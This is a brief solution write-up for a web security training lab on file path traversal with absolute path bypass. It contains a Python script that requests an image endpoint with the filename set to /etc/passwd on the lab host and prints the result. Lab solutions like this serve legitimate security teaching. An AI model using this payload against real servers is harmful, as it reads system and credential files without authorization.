# Lab: File path traversal, traversal sequences blocked with absolute path bypass

link to lab: https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass

Solution: 

```python
import requests

response = requests.get(
    'https://0a38008d033f4a9ccd5336c5005900cf.web-security-academy.net/image?filename=/etc/passwd',
    verify=False,
)

print(response.text)
```